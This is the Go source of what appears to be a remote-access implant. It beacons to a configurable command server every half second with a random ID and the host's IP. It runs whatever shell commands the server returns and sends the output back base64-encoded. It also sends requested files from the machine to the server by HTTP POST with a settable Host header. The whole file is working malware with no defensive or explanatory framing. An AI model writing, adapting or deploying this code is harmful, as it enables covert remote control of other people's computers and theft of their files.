package main

import (
	"os"
	"io"
	"fmt"
	"log"
	"time"
	"net"
	"bytes"
	"errors"
	"strings"
	"os/exec"
	"net/http"
	"math/rand"
	"encoding/json"
	"mime/multipart"
	b64 "encoding/base64"
)

type CommandResponse struct {
	Exec []string
	Download []string
}

type CommandUpdate struct {
	Ip string
	Id string
	Type string
	Data string
}

const idBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

var msPerUpdate int = 500
var idLen int = 8
var cmdAddress string
var cmdPort string
var cmdHost string
var id string
var ip string
var queryData string
var debug bool = true
var netClient = &http.Client{
	Timeout: time.Second * 10,
}

func debugFatal(err error) {
	if err != nil && debug {
		log.Fatal(err)
	}
}

func queryCommandHttp(endpoint string) (resp *http.Response, err error) {
	url := "http://" + cmdAddress + ":" + cmdPort + "/" + endpoint
	req, err := http.NewRequest("GET", url, nil)
	debugFatal(err)
	req.Host = cmdHost
	return netClient.Do(req)
}

func handleCommandResponse(commResp CommandResponse) {
	for _, cmd := range commResp.Exec {
		cmdSplit := strings.Fields(cmd);
		out, err := exec.Command(cmdSplit[0], cmdSplit[1:]...).Output()
		debugFatal(err)

		if err == nil && len(out) > 0 {
			data, err := json.Marshal(CommandUpdate{ip,id,"exec",string(out)})
			debugFatal(err)
			encoded := b64.StdEncoding.EncodeToString(data)
			queryCommandHttp(encoded)
		}
	}

	for _, file := range commResp.Download {
		upload(file)
	}
}

func getCommandUpdateHttp() {
	resp, err := queryCommandHttp(queryData)
	debugFatal(err)

	if err == nil {
		defer resp.Body.Close()

		if err != nil || resp.Status != "200 OK" {
			fmt.Println("Command status != 200: " + resp.Status)
		}
		
		controlDataBytes, err := io.ReadAll(resp.Body)
		debugFatal(err)
		var commResp CommandResponse
		json.Unmarshal(controlDataBytes, &commResp)
		
		handleCommandResponse(commResp)
	} else if debug {
		fmt.Println("Couldn't reach command.")
	}
}

func externalIP() (string, error) {
	ifaces, err := net.Interfaces()

	if err != nil {
		return "", err
	}

	for _, iface := range ifaces {
		if iface.Flags&net.FlagUp == 0 {
			continue // interface down
		}
		if iface.Flags&net.FlagLoopback != 0 {
			continue // loopback interface
		}
		addrs, err := iface.Addrs()
		if err != nil {
			return "", err
		}
		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}
			if ip == nil || ip.IsLoopback() {
				continue
			}
			ip = ip.To4()
			if ip == nil {
				continue // not an ipv4 address
			}
			return ip.String(), nil
		}
	}

	return "", errors.New("not connected")
}

func genRandID() string {
	rand.Seed(time.Now().UTC().UnixNano())
    b := make([]byte, idLen)
    
	for i := range b {
        b[i] = idBytes[rand.Intn(len(idBytes))]
    }
    
	return string(b)
}

func upload(filename string) {
	data, err := json.Marshal(CommandUpdate{ip,id,"upload",filename})
	debugFatal(err)
	
	if err != nil {
		return
	}

	encoded := b64.StdEncoding.EncodeToString(data)
	url := "http://" + cmdAddress + ":" + cmdPort + "/" + encoded
	
    var b bytes.Buffer
    w := multipart.NewWriter(&b)
    var fw io.Writer
    file, err := os.Open(filename)
    debugFatal(err)
	
	if err != nil {
		return
	}
	if fw, err = w.CreateFormFile("file", file.Name()); err != nil {
    	debugFatal(err)
		return
    }    
	if _, err = io.Copy(fw, file); err != nil {
		debugFatal(err)
		return
    }

    w.Close()

	req, err := http.NewRequest("POST", url, &b)
	req.Host = cmdHost
	debugFatal(err)
	req.Header.Set("Content-Type", w.FormDataContentType())
    _, err = netClient.Do(req)
	debugFatal(err)
}

func main() {
	lhost, err := externalIP()
	debugFatal(err)
	ip = lhost
	id = genRandID()
	data, err := json.Marshal(CommandUpdate{ip,id,"",""})
	debugFatal(err)
	
	queryData = b64.StdEncoding.EncodeToString(data)

	for range time.Tick(time.Millisecond * time.Duration(msPerUpdate)) {
		go func() {
        	getCommandUpdateHttp()
		}()
	}
}